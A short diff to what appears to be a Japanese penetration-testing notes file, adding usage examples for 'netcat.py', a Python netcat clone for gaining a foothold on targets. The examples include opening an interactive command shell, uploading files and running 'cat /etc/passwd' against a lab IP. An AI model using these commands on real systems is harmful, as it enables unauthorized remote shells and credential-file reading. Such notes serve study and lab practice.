@@ -18,3 +18,18 @@ Content-Length: 0
 Authorization: Basic *
 ```
 
+## netcat.py
+Python環境が存在（ほぼある）するターゲットで簡易的に足場を構築するためのもの
+
+```
+# 対話型コマンドシェルの起動
+netcat.py -t 10.11.14.13 -p 4444 -l -c
+# ファイルのアップロード
+netcat.py -t 10.11.14.13 -p 4444 -l -u=mytest.whatisup
+# コマンドの実行
+netcat.py -t 10.11.14.13 -p 4444 -l -e=\"cat /etc/passwd\"
+# 通信先サーバーの135番ポートに文字列を送信
+echo 'ABCDEFGHI' | ./netcat.py -t 10.11.14.13 -p 135
+# サーバーに接続
+netcat.py -t 10.11.14.13 -p 4444
+```
